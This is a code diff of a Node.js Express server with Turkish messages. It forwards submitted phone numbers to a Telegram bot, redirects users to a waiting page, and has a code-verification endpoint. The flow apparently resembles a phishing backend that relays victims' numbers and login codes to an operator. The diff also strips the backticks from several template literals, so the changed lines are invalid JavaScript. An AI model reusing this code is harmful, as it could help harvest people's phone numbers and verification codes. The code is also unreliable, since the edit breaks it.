@@ -19,9 +19,9 @@ app.post('/send-phone', (req, res) => {
         return res.status(400).send('Telefon numarası eksik');
     }
 
-    const message = `Yeni telefon numarası: ${phone}`;
+    const message = Yeni telefon numarası: ${phone};
 
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
     const payload = JSON.stringify({
         chat_id: CHAT_ID,
         text: message
@@ -29,7 +29,7 @@ app.post('/send-phone', (req, res) => {
 
     const options = {
         hostname: 'api.telegram.org',
-        path: `/bot${BOT_TOKEN}/sendMessage`,
+        path: /bot${BOT_TOKEN}/sendMessage,
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -46,8 +46,6 @@ app.post('/send-phone', (req, res) => {
         response.on('end', () => {
             const jsonResponse = JSON.parse(data);
             if (jsonResponse.ok) {
-                res.status(200).send('Telefon numarası Telegram botuna gönderildi');
-                // Bekleme sayfasına yönlendir
                 res.redirect('/waiting.html');
             } else {
                 res.status(500).send('Telegram API hatası');
@@ -75,7 +73,7 @@ app.post('/verify-code', (req, res) => {
 });
 
 // Sunucu başlatma
-const port = 5000;
+const port = process.env.PORT || 5000; // Dinamik port kullanımı
 app.listen(port, () => {
-    console.log(`Sunucu ${port} portunda çalışıyor`);
+    console.log(Sunucu ${port} portunda çalışıyor);
 });
